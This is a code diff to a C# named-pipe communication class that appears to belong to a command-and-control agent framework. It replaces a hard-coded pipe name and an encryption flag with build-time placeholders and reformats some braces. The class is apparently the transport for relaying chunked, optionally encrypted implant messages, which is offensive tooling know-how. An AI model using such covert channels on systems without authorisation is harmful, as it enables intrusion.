@@ -39,10 +39,10 @@ namespace Athena.Config
     {
         public string psk { get; set; }
         private PipeServer<DelegateMessage> serverPipe { get; set; }
-        public string pipeName = "scottie_pipe";
+        public string pipeName = "pipename";
         private bool connected { get; set; }
         public bool encrypted { get; set; }
-        public bool encryptedExchangeCheck = bool.Parse("false");
+        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
         public PSKCrypto crypt { get; set; }
         public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
@@ -73,7 +73,8 @@ namespace Athena.Config
                 //Add message to out queue.
                 if (this.partialMessages.ContainsKey(args.Message.uuid))
                 {
-                    if (args.Message.final) {
+                    if (args.Message.final)
+                    {
                         string curMessage = args.Message.message;
 
                         args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
@@ -144,9 +145,9 @@ namespace Athena.Config
 
                 IEnumerable<string> parts = json.SplitByLength(50000);
 
-                foreach(string part in parts)
+                foreach (string part in parts)
                 {
-                    if(part == parts.Last())
+                    if (part == parts.Last())
                     {
                         dm = new DelegateMessage()
                         {
